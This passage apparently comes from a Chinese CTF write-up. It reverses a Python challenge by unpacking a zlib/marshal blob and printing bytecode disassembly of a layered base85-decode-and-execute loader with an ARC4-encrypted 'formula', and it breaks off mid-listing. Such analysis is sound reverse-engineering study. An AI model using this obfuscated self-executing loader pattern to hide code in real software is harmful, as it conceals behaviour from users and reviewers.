8\xe2B\xde|\r&gt;HaF.C\xd5\x9e\x13d\xae)\xbe0\x95\x830g,\xf1x\x82\xa6F\xc4R`\x87q\xd5)O\x96\x8b\xd6\xe5S\xa3\xb7\xaa\xaf\xe0[\xb8~\xc2\xc8\xc5IO\xe6x`\xbbn\xce\xea\xaaI0,B&quot;\xccb\xb9\r\xa3U\x06\xed\x8dS`3\x9c\xaf\xb5\xa8\xe8\xfa\x0eB\x10\xe4I\x81U\x16\x9c\xc9\xae\x17\xda\xecIY\xd4\xc4\xf5\x82\x7f\xd2\x13W\xb6\xa8\xf1\xa2\xf9\xe4B\xec&gt;.\x8a\xbc.\xdc\xe6yv\xcd*[k\xfd\xa4H\xe6\x9eXk\x93\xd5\x84\xa7O\x9f\xee&gt;\xeam\xb5\xf5\\\xb4\x16\xbb[\xa8\xf0\n\xea\x89\xa6\xad^\xf2\xf0/\xcf\xf79\xd6\x12c\xd8\xf9\x8d\xddE\xec\xfc@eMk\xce*\xe7&#123;\xeb\xad!Z\xe7\xc7\x17-]\x10\x85\xc9\xab\xfe\x93\x17\xbd\xcf\xf7\x0cs\xa1\xad\xcfoq\xd7Q\xe1v\x06\xf1\xfc\x90\xd7U\xc3\x14-\xebG\xf4\xf9\x17\xb7\xc9\x17\xe1\xf3\xe3\x97\xbd\x95\x0b0&#123;\xf1:\x93\xe7\x95\xf7\x14\x9d\x15\xac\xf3\xfb\xaf5n\xa3\x13\x9d\x93E~&#125;~\xa7dk\xfcz\xa1k\xfd\xcb@\xe7\x073E\xe7X\xc5:\x7f\xf8\x1a^h\xb7\xdc\x05\x98H/\xc9\xbf\x00?\xdc^\xfb\xfe\xfb\x10\x7f%c\xbd:\xb5\xf4\xf9M\\\xd5\x05[\x11\xd3\xe6\xaf\x9f\xdf\x12\x01\xc0\xfa\xfd\xe5\xf1\xfd\xdd\xab\xab\xab\xef\x80w\xbf\x05\xde\xfe\x16x\xef[\xe0\x9d\xef\xef\x03\x1f\xd6&lt;7\xc0\xe3\x7f\x01\xf7n\xee#_\x01O\xffy\xbb\xf9\xe4+\xc0\xff\xcd#\xdfg\xd2\xd7\x8f|_&gt;\xf2\xdd|\x92~\xf6(s\x03&lt;\xfc\xe6\x03\xf8\x8f\xde?\x7f\xfa\xa7Oo\x02\xa9g\x1f\xa4/u\xdf&lt;\xf6~\xe6|~\xfc\xc3\xf1\x06\xc2\x9f=N\xdd\x00\xef?\xef\xe4\xfb\n\xf8\xe4\xd2\xfbc\xf4\x8f\xe2\xd7\x1f\x85\xbe\xfc(t\x83\x12\x7fs\xfe\xbe&#125;\xf6Q\xe7\x06\xf8\xf0?\xf7\x81\xab\xdf\xfe\x03\xf8\x9d\xf9\xf02\xd3\xff\x00hw\x9dH&#x27;</span></span><br><span class="line">sequencer_code = zlib.decompress(encrypted_sequencer_data)</span><br><span class="line">code = marshal.loads(sequencer_code)</span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">0</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> <span class="number">2</span>           <span class="number">2</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">4</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">6</span> IMPORT_NAME              <span class="number">0</span> (base64)</span><br><span class="line">             <span class="number">8</span> STORE_NAME               <span class="number">0</span> (base64)</span><br><span class="line"></span><br><span class="line"> <span class="number">3</span>          <span class="number">10</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">12</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">            <span class="number">14</span> IMPORT_NAME              <span class="number">1</span> (zlib)</span><br><span class="line">            <span class="number">16</span> STORE_NAME               <span class="number">1</span> (zlib)</span><br><span class="line"></span><br><span class="line"> <span class="number">4</span>          <span class="number">18</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">20</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">            <span class="number">22</span> IMPORT_NAME              <span class="number">2</span> (marshal)</span><br><span class="line">            <span class="number">24</span> STORE_NAME               <span class="number">2</span> (marshal)</span><br><span class="line"></span><br><span class="line"> <span class="number">5</span>          <span class="number">26</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">28</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">            <span class="number">30</span> IMPORT_NAME              <span class="number">3</span> (types)</span><br><span class="line">            <span class="number">32</span> STORE_NAME               <span class="number">3</span> (types)</span><br><span class="line"></span><br><span class="line"> <span class="number">8</span>          <span class="number">34</span> LOAD_CONST               <span class="number">2</span> (b<span class="string">&#x27;c$|e+O&gt;7&amp;-6`m!Rzak~llE|2&lt;;!(^*VQn#qEH||xE2b$*W=zw8NW~2mgIMj3sFjzy%&lt;NJQ84^$vqeTG&amp;mC+yhlE677j-8)F4nD&gt;~?&lt;GqL64olvBs$bZ4&#123;qE;&#123;|=p@M4Abeb^*&gt;CzIprJ_rCXLX1@k)54$HHULnIe5P-l)Ahj!*6w&#123;D~l%XMwDPu#jDYhX^DN&#123;q5Q|5-Wq%1@lBx&#125;&#125;|vN1p~UI8h)0U&amp;nS13Dg&#125;x8K^E-(q$p0&#125;4!ly-%m&#123;0Hd&gt;^+3*&lt;O&#123;*s0K-lk|&#125;BLHWKJweQrNz5&#123;%F-;@E_&#123;d+ImTl7-o7&amp;&#125;O&#123;%uba)w1RL*UARX*79t+0&lt;^B?zmlODX9|2bzp_ztwjy_TdKb)1%eP4d-Xti0Ygjk_%w!^%1xuMNv4Z8&amp;(*Ue7_^Fby1n3;+G&lt;VDAfqi^h1&gt;0@=Eki5!M~rms%afx`+uxa0*;FzudpqNln5M&lt;@!OqndZ)R&lt;vh4u&amp;gpmmnaMewbT0RJby?(fa7XW#r&gt;ZQ4UE&amp;u|~lZsEY~-lpfWMf0_+pV-H`PXInpwmyo~mZ`tfUK?($KHa%mvNlovZ;Y)D+e6uw+mY6LNB2Y9&amp;akbWpZ@lh=Si&lt;!J@t|CG86E`)jp!l4xEY(h7@$llA4&#125;B9dpL*j)eL&#123;vVcbyMx5_&#123;b13)N@wa~epS8Zfo&amp;V_Y#fM*g9;@6%j=%i%WB0=QS3ewj@0~B!iibu&lt;MqrrJIH&#123;m&amp;FoAGB3#0Nf;x!~dvQ|9#3c&#125;)IL6kEvhByJvA&#123;B9%UqX0Tg*-+Ak~NW&amp;RJbB?a6weENW&amp;rzRi2ZB!647HWlA^rG4gvj3Yteo30&amp;*&#125;;59;7nJF7eh7vjEXwwxPWWzD*3&lt;IvZS#lIL(l*?u$;EGifKfLDpVb*rXLyw!AP~ZT^-S=4X&#123;31tqe&lt;O1kwG$gBZnu8eva3~6;4CxrcH1&#123;Qg&#123;M;GT5@Bdqt%s&#123;xkT;DyaBk)v&gt;cTr#=XM@cQ-VZZJ1azh&#123;1Df~fwf(mdYk_cEC``#zrevUuf1-I7DHKqx9c7Me?*iNur9a3~o)A1AmHbK!6#k&lt;d+QmXjoUlrAc=R-8EfEvn$TP%?Zb2%`-;wF2Z7c~Qh!QUp%@F7d(Q;It@nl31iwc^NCTTrj*OW)bEH&gt;BYlQ$YmihSV2QDxrCsKNToEmsNif~;-ILG+l$@~sMDcnEHYIbjb?L-swo%&gt;NNY60QJ5`2LX(&amp;$CFf*W(cl7t80939@QH+&gt;;!kK4jMTiOQA&#125;zM@dS+wmk4?RtsqIs(NtuZr(Ewj&lt;zxXaVots!6&lt;&#125;UP5&gt;nNp1gfkes4T*zd&#123;)6h-GF4&gt;NSQO&#125;R*91&#123;c`k!=D-D&#125;baN$1fuVNrUDvGiYVXWYBI456&#123;mCG`ukuZfpN)A&lt;xyb=s&#125;byE(DvZfmpRkvo4CMg+F*3C%f6#?m&#123;g@T4u-G&lt;~mB~wGXg;NVMFDj&amp;f5&lt;)qG1#7xlYdFEQ_jHRu*e&amp;FUmQ1J&lt;Gp&#125;4$xq@yalC(x)S-FIEgQe+IxARLJPRm@DXx&amp;t+&lt;h5L0ORJ&lt;E&lt;cw&#125;6ln6?exLHy&#125;9_dE4pz17oL(~E`&#123;a`E-no7?`5)pDEpNY(-6VaJ?C^&lt;J9(GN!A;n`PTPDZBE;WN&gt;5k=ams`uyy&lt;xmZYd@Og|04&#123;1U(*1PGLR&gt;h3WX?aZWQf~69?j-FsmL^GvInrgidoM2&#125;r1u&amp;&#125;XB+q&#125;oGg-NR#n^X*4uqBy?1qY$4&lt;jzMBhXA);zPfx3*xU!VW$#fFa&amp;MCOfRHVn0%6k8aaRw9dY?)7!uP!nGHEb#k+JxY|2h&gt;kX&#123;N&#123;%!`IfvPX|S@e!nA3Iy~#cKVr)%cFx&#123;mYSGj9h1H_Q6edkhuGk)3Z9gWp`~mJzG74m7(!J^o(!2de`mO?3IDzcV;$RQ`@foiYHlj%&#123;3;+&gt;#iT|K&gt;v-`YH)PTx#fRu(|@AsKT#P^)cna!|9sUyU-MtAxP&#125;M&gt;w|Cc1s4_KI9hlp2y|UAEJ$C2$4Oh6~@uj-!Y-5tEyI$Y%KECN4u6l&lt;*?fcwR_fD^|+djDIJ5u!&gt;A&amp;1N9itm&#123;&lt;3o-un;-)89^#pIPd&#123;VwyzH_1WOyqZ$H)k$XXD-xcUafgjb=N#i!+Onn-Tj-cEob+(!(BOWa&gt;FtC;21DH&#123;%^IHo=c%;r;jstN15qS_U^F=Ab$c5Oh5W?fY!%^vdXfE&gt;5Yf!rHF^&lt;aF`B*be*L=(CF(%-E&lt;?)%b0$BJ)|f2ZjG%ISw+Z8XcC`j+)bpk&lt;79YXWEkdaV7mwG_kiObaNYym&amp;C&amp;ix(EpA7N#?&#125;|aRxAsRm;!2e%e)a4AvZnHUPvwCa?b&amp;OiHoo&#x27;</span>)</span><br><span class="line">            <span class="number">36</span> STORE_NAME               <span class="number">4</span> (encoded_catalyst_strand)</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>          <span class="number">38</span> PUSH_NULL</span><br><span class="line">            <span class="number">40</span> LOAD_NAME                <span class="number">5</span> (print)</span><br><span class="line">            <span class="number">42</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;--- Calibrating Genetic Sequencer ---&#x27;</span>)</span><br><span class="line">            <span class="number">44</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">52</span> POP_TOP</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>          <span class="number">54</span> PUSH_NULL</span><br><span class="line">            <span class="number">56</span> LOAD_NAME                <span class="number">5</span> (print)</span><br><span class="line">            <span class="number">58</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;Decoding catalyst DNA strand...&#x27;</span>)</span><br><span class="line">            <span class="number">60</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">68</span> POP_TOP</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>          <span class="number">70</span> PUSH_NULL</span><br><span class="line">            <span class="number">72</span> LOAD_NAME                <span class="number">0</span> (base64)</span><br><span class="line">            <span class="number">74</span> LOAD_ATTR               <span class="number">12</span> (b85decode)</span><br><span class="line">            <span class="number">94</span> LOAD_NAME                <span class="number">4</span> (encoded_catalyst_strand)</span><br><span class="line">            <span class="number">96</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">           <span class="number">104</span> STORE_NAME               <span class="number">7</span> (compressed_catalyst)</span><br><span class="line"></span><br><span class="line"><span class="number">13</span>         <span class="number">106</span> PUSH_NULL</span><br><span class="line">           <span class="number">108</span> LOAD_NAME                <span class="number">1</span> (zlib)</span><br><span class="line">           <span class="number">110</span> LOAD_ATTR               <span class="number">16</span> (decompress)</span><br><span class="line">           <span class="number">130</span> LOAD_NAME                <span class="number">7</span> (compressed_catalyst)</span><br><span class="line">           <span class="number">132</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">           <span class="number">140</span> STORE_NAME               <span class="number">9</span> (marshalled_genetic_code)</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>         <span class="number">142</span> PUSH_NULL</span><br><span class="line">           <span class="number">144</span> LOAD_NAME                <span class="number">2</span> (marshal)</span><br><span class="line">           <span class="number">146</span> LOAD_ATTR               <span class="number">20</span> (loads)</span><br><span class="line">           <span class="number">166</span> LOAD_NAME                <span class="number">9</span> (marshalled_genetic_code)</span><br><span class="line">           <span class="number">168</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">           <span class="number">176</span> STORE_NAME              <span class="number">11</span> (catalyst_code_object)</span><br><span class="line"></span><br><span class="line"><span class="number">16</span>         <span class="number">178</span> PUSH_NULL</span><br><span class="line">           <span class="number">180</span> LOAD_NAME                <span class="number">5</span> (print)</span><br><span class="line">           <span class="number">182</span> LOAD_CONST               <span class="number">5</span> (<span class="string">&#x27;Synthesizing Catalyst Serum...&#x27;</span>)</span><br><span class="line">           <span class="number">184</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">           <span class="number">192</span> POP_TOP</span><br><span class="line"></span><br><span class="line"><span class="number">19</span>         <span class="number">194</span> PUSH_NULL</span><br><span class="line">           <span class="number">196</span> LOAD_NAME                <span class="number">3</span> (types)</span><br><span class="line">           <span class="number">198</span> LOAD_ATTR               <span class="number">24</span> (FunctionType)</span><br><span class="line">           <span class="number">218</span> LOAD_NAME               <span class="number">11</span> (catalyst_code_object)</span><br><span class="line">           <span class="number">220</span> PUSH_NULL</span><br><span class="line">           <span class="number">222</span> LOAD_NAME               <span class="number">13</span> (globals)</span><br><span class="line">           <span class="number">224</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">           <span class="number">232</span> <span class="keyword">CALL</span>                     <span class="number">2</span></span><br><span class="line">           <span class="number">240</span> STORE_NAME              <span class="number">14</span> (catalyst_injection_function)</span><br><span class="line"></span><br><span class="line"><span class="number">22</span>         <span class="number">242</span> PUSH_NULL</span><br><span class="line">           <span class="number">244</span> LOAD_NAME               <span class="number">14</span> (catalyst_injection_function)</span><br><span class="line">           <span class="number">246</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">           <span class="number">254</span> POP_TOP</span><br><span class="line">           <span class="number">256</span> RETURN_CONST             <span class="number">1</span> (None)</span><br></pre></td></tr></table></figure>

<p>base85解码后解压缩得到一段新的字节码，继续反编译：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>           <span class="number">2</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">              <span class="number">4</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">              <span class="number">6</span> IMPORT_NAME              <span class="number">0</span> (os)</span><br><span class="line">              <span class="number">8</span> STORE_NAME               <span class="number">0</span> (os)</span><br><span class="line"></span><br><span class="line">  <span class="number">3</span>          <span class="number">10</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">14</span> IMPORT_NAME              <span class="number">1</span> (sys)</span><br><span class="line">             <span class="number">16</span> STORE_NAME               <span class="number">1</span> (sys)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">18</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">20</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">22</span> IMPORT_NAME              <span class="number">2</span> (emoji)</span><br><span class="line">             <span class="number">24</span> STORE_NAME               <span class="number">2</span> (emoji)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">26</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">28</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">30</span> IMPORT_NAME              <span class="number">3</span> (random)</span><br><span class="line">             <span class="number">32</span> STORE_NAME               <span class="number">3</span> (random)</span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">34</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">38</span> IMPORT_NAME              <span class="number">4</span> (asyncio)</span><br><span class="line">             <span class="number">40</span> STORE_NAME               <span class="number">4</span> (asyncio)</span><br><span class="line"></span><br><span class="line">  <span class="number">7</span>          <span class="number">42</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">44</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">46</span> IMPORT_NAME              <span class="number">5</span> (cowsay)</span><br><span class="line">             <span class="number">48</span> STORE_NAME               <span class="number">5</span> (cowsay)</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">50</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">52</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">54</span> IMPORT_NAME              <span class="number">6</span> (pyjokes)</span><br><span class="line">             <span class="number">56</span> STORE_NAME               <span class="number">6</span> (pyjokes)</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">58</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">60</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">             <span class="number">62</span> IMPORT_NAME              <span class="number">7</span> (art)</span><br><span class="line">             <span class="number">64</span> STORE_NAME               <span class="number">7</span> (art)</span><br><span class="line"></span><br><span class="line"> <span class="number">10</span>          <span class="number">66</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">68</span> LOAD_CONST               <span class="number">2</span> ((<span class="string">&#x27;ARC4&#x27;</span>,))</span><br><span class="line">             <span class="number">70</span> IMPORT_NAME              <span class="number">8</span> (arc4)</span><br><span class="line">             <span class="number">72</span> IMPORT_FROM              <span class="number">9</span> (ARC4)</span><br><span class="line">             <span class="number">74</span> STORE_NAME               <span class="number">9</span> (ARC4)</span><br><span class="line">             <span class="number">76</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>          <span class="number">78</span> LOAD_CONST               <span class="number">3</span> (&lt;code object activate_catalyst <span class="meta">at</span> <span class="number">0x000001DBD89A1110</span>, file <span class="string">&quot;&lt;catalyst_core&gt;&quot;</span>, line <span class="number">15</span>&gt;)</span><br><span class="line">             <span class="number">80</span> MAKE_FUNCTION            <span class="number">0</span></span><br><span class="line">             <span class="number">82</span> STORE_NAME              <span class="number">10</span> (activate_catalyst)</span><br><span class="line"></span><br><span class="line"> <span class="number">54</span>          <span class="number">84</span> PUSH_NULL</span><br><span class="line">             <span class="number">86</span> LOAD_NAME                <span class="number">4</span> (asyncio)</span><br><span class="line">             <span class="number">88</span> LOAD_ATTR               <span class="number">22</span> (run)</span><br><span class="line">            <span class="number">108</span> PUSH_NULL</span><br><span class="line">            <span class="number">110</span> LOAD_NAME               <span class="number">10</span> (activate_catalyst)</span><br><span class="line">            <span class="number">112</span> <span class="keyword">CALL</span>                     <span class="number">0</span></span><br><span class="line">            <span class="number">120</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">            <span class="number">128</span> POP_TOP</span><br><span class="line">            <span class="number">130</span> RETURN_CONST             <span class="number">1</span> (None)</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object activate_catalyst <span class="meta">at</span> <span class="number">0x000001DBD89A1110</span>, file <span class="string">&quot;&lt;catalyst_core&gt;&quot;</span>, line <span class="number">15</span>&gt;:</span><br><span class="line"> <span class="number">15</span>           <span class="number">0</span> RETURN_GENERATOR</span><br><span class="line">              <span class="number">2</span> POP_TOP</span><br><span class="line">              <span class="number">4</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>           <span class="number">6</span> LOAD_CONST               <span class="number">1</span> (b<span class="string">&#x27;m\x1b@I\x1dAoe@\x07ZF[BL\rN\n\x0cS&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> STORE_FAST               <span class="number">0</span> (LEAD_RESEARCHER_SIGNATURE)</span><br><span class="line"></span><br><span class="line"> <span class="number">17</span>          <span class="number">10</span> LOAD_CONST               <span class="number">2</span> (b<span class="string">&#x27;r2b-\r\x9e\xf2\x1fp\x185\x82\xcf\xfc\x90\x14\xf1O\xad#]\xf3\xe2\xc0L\xd0\xc1e\x0c\xea\xec\xae\x11b\xa7\x8c\xaa!\xa1\x9d\xc2\x90&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> STORE_FAST               <span class="number">1</span> (ENCRYPTED_CHIMERA_FORMULA)</span><br><span class="line"></span><br><span class="line"> <span class="number">19</span>          <span class="number">14</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;--- Catalyst Serum Injected ---&#x27;</span>)</span><br><span class="line">             <span class="number">26</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">             <span class="number">34</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">20</span>          <span class="number">36</span> LOAD_GLOBAL              <span class="number">1</span> (NULL + print)</span><br><span class="line">             <span class="number">46</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&quot;Verifying Lead Researcher&#x27;s credentials via biometric scan...&quot;</span>)</span><br><span class="line">             <span class="number">48</span> <span class="keyword">CALL</span>                     <span class="number">1</span></span><br><span class="line">             <span class="number">56</span> POP_TOP</span><br><span class="line"></span><br><span class="line"> <span class="number">22</span>          <span class="number">58</span> LOAD_GLOBAL              <span 